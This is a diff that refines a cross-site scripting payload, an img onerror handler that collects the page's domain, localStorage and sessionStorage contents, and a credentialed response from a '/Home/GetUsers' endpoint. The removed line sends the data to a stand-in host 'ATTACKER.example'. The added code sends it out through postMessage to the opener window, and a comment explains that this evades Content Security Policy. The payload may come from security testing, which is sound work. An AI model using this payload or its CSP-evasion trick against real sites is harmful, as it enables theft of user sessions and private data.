@@ -1,13 +1,15 @@
 <img src=x onerror="(async()=>{
-  const beacon = (o) => new Image().src = 'https://ATTACKER.example/collect?d=' + encodeURIComponent(JSON.stringify(o));
+  // Exfil via postMessage to the attacker page that opened this window. postMessage is not
+  // restricted by CSP, unlike new Image()/fetch to an arbitrary host (blocked by img-src/connect-src).
+  const exfil = (o) => { try { (window.opener||window.parent).postMessage(JSON.stringify(o), '*'); } catch(e){} };
   const proof = { origin: document.domain, url: location.href, hasCookie: !!document.cookie };
-  try { proof.localStorage = localStorage; } catch(e){}
-  try { proof.sessionStorage = sessionStorage; } catch(e){}
+  try { proof.localStorage = {...localStorage}; } catch(e){}
+  try { proof.sessionStorage = {...sessionStorage}; } catch(e){}
   try {
     const r = await fetch('/Home/GetUsers?query=a', {credentials:'include'});
     const t = await r.text();
     proof.getUsers = { status: r.status, body: t };
   } catch(e){ proof.getUsers = 'err'; }
   alert('XSS on '+document.domain+'\nsession='+proof.hasCookie+'\nGetUsers='+JSON.stringify(proof.getUsers));
-  beacon(proof);
+  exfil(proof);
 })()">
